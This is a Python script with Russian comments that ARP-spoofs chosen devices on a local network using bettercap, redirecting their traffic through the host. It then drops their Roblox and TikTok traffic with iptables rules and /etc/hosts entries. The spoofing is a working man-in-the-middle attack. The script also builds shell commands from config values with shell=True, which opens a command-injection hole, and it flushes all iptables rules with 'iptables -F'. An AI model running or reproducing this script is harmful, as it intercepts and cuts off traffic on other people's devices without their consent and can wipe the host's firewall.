import subprocess
import logging
import json

# Логирование
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Загружаем конфиг
CONFIG_FILE = "throttle_config.json"

def load_config():
    """Загружает настройки из файла."""
    try:
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        logging.error("Файл конфигурации не найден!")
        return {}

config = load_config()

# Настройки
INTERFACE = config.get("interface", "eno1")
ROUTER_IP = config.get("router_ip", "192.168.1.1")
TARGET_DEVICES = config.get("target_devices", [])
ROBLOX_IP_RANGES = config.get("roblox_ip_ranges", [])
ROBLOX_PORTS = config.get("roblox_ports", [])
DNS_BLOCK = config.get("dns_block", [])
TIKTOK_IP_RANGES = config.get("tiktok_ip_ranges", [])
TIKTOK_DNS = config.get("tiktok_dns", [])
BLOCK_UDP = config.get("block_udp", True)
BLOCK_DNS = config.get("block_dns", True)

def run_command(cmd):
    """Выполняет команду в терминале и логирует её выполнение."""
    try:
        subprocess.run(cmd, shell=True, check=True)
        logging.info(f"✅ {cmd}")
    except subprocess.CalledProcessError as e:
        logging.error(f"❌ Ошибка: {e}")

def enable_arp_spoofing():
    """Запускаем ARP-спуфинг ТОЛЬКО для выбранных устройств."""
    logging.info(f"🚀 Перенаправляем трафик через {INTERFACE} для {TARGET_DEVICES}...")
    for device_ip in TARGET_DEVICES:
        run_command(f"cd ~/Programs/bettercap && sudo go run main.go -eval 'set arp.spoof.targets {device_ip}; arp.spoof on' &")

def disable_arp_spoofing():
    """Останавливаем ARP-спуфинг."""
    logging.info("⛔ Останавливаем ARP-спуфинг...")
    run_command("sudo pkill bettercap")

def block_roblox():
    """Полностью блокируем трафик Roblox ТОЛЬКО для указанных устройств."""
    logging.info("⛔ Блокируем доступ к Roblox для выбранных устройств...")

    # Очищаем старые правила
    run_command("sudo iptables -F")

    for device_ip in TARGET_DEVICES:
        # Блокируем IP-адреса серверов для устройства
        for ip_range in ROBLOX_IP_RANGES:
            run_command(f"sudo iptables -A FORWARD -s {device_ip} -d {ip_range} -j DROP")
            run_command(f"sudo iptables -A OUTPUT -s {device_ip} -d {ip_range} -j DROP")
            if BLOCK_UDP:
                run_command(f"sudo iptables -A FORWARD -s {device_ip} -p udp -d {ip_range} -j DROP")
                run_command(f"sudo iptables -A OUTPUT -s {device_ip} -p udp -d {ip_range} -j DROP")

        # Блокируем игровые порты
        for port in ROBLOX_PORTS:
            run_command(f"sudo iptables -A FORWARD -s {device_ip} -p udp --dport {port} -j DROP")
            run_command(f"sudo iptables -A OUTPUT -s {device_ip} -p udp --dport {port} -j DROP")

    # Блокируем DNS-запросы Roblox
    if BLOCK_DNS:
        for domain in DNS_BLOCK:
            run_command(f"echo '127.0.0.1 {domain}' | sudo tee -a /etc/hosts")

    # Чистим кэш DNS
    run_command("sudo systemctl restart systemd-resolved")
    run_command("sudo resolvectl flush-caches")

    logging.info("✅ Roblox уничтожен для выбранных устройств!")

def unblock_roblox():
    """Разблокируем Roblox для выбранных устройств."""
    logging.info("⛔ Отключаем блокировку Roblox...")
    run_command("sudo iptables -F")
    run_command("sudo sed -i '/roblox.com/d' /etc/hosts")
    run_command("sudo systemctl restart systemd-resolved")
    run_command("sudo resolvectl flush-caches")
    logging.info("✅ Roblox снова доступен!")

def block_tiktok():
    """Полностью блокируем трафик TikTok ТОЛЬКО для указанных устройств."""
    logging.info("⛔ Блокируем доступ к TikTok для выбранных устройств...")

    # Блокируем IP-адреса TikTok для устройства
    for device_ip in TARGET_DEVICES:
        for ip_range in TIKTOK_IP_RANGES:
            run_command(f"sudo iptables -A FORWARD -s {device_ip} -d {ip_range} -j DROP")
            run_command(f"sudo iptables -A OUTPUT -s {device_ip} -d {ip_range} -j DROP")
            if BLOCK_UDP:
                run_command(f"sudo iptables -A FORWARD -s {device_ip} -p udp -d {ip_range} -j DROP")
                run_command(f"sudo iptables -A OUTPUT -s {device_ip} -p udp -d {ip_range} -j DROP")

    # Блокируем DNS-запросы TikTok
    if BLOCK_DNS:
        for domain in TIKTOK_DNS:
            run_command(f"echo '127.0.0.1 {domain}' | sudo tee -a /etc/hosts")

    # Чистим кэш DNS
    run_command("sudo systemctl restart systemd-resolved")
    run_command("sudo resolvectl flush-caches")

    logging.info("✅ TikTok уничтожен для выбранных устройств!")

def unblock_tiktok():
    """Разблокируем TikTok для выбранных устройств."""
    logging.info("⛔ Отключаем блокировку TikTok...")
    run_command("sudo sed -i '/tiktok.com/d' /etc/hosts")
    run_command("sudo iptables -F")
    run_command("sudo systemctl restart systemd-resolved")
    run_command("sudo resolvectl flush-caches")
    logging.info("✅ TikTok снова доступен!")

if __name__ == "__main__":
    while True:
        action = input("💀 Введите команду (block/unblock/blocktiktok/unblocktiktok/exit): ").strip().lower()
        if action == "block":
            enable_arp_spoofing()
            block_roblox()
        elif action == "unblock":
            disable_arp_spoofing()
            unblock_roblox()
        elif action == "blocktiktok":
            enable_arp_spoofing()
            block_tiktok()
        elif action == "unblocktiktok":
            disable_arp_spoofing()
            unblock_tiktok()
        elif action == "exit":
            disable_arp_spoofing()
            break
        else:
            print("🚨 Неправильная команда! Используйте 'block', 'unblock', 'blocktiktok', 'unblocktiktok' или 'exit'")
